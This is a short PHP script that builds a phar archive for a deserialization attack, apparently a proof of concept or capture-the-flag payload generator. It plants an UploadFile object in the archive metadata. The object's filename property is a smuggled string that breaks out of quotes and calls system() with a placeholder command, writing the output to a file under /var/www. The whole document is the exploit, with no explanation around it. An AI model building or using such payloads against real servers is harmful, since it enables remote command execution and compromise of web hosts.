<?php

class UploadFile {
	public $filename="'.system('[COMMAND] > /var/www/[Name for http://[URL]/Name]').'";
}

$o=new UploadFile();

$phar = new Phar("phar.phar");
$phar->startBuffering();

$phar->addFromString("test.txt","test");
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$phar->setMetadata($o);
$phar->stopBuffering();

?>
